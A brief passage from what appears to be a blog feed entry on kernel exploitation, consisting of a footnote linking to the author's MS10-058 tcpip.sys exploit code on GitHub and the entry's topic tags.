+&lt;p&gt;[5] &lt;a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp"&gt;The code of my exploit for MS10-058&lt;/a&gt;&lt;/p&gt;</content><category term="reverse-engineering"></category><category term="exploitation"></category><category term="kernel pool"></category><category term="ms10-058"></category><category term="tcpip.sys"></category></entry></feed>
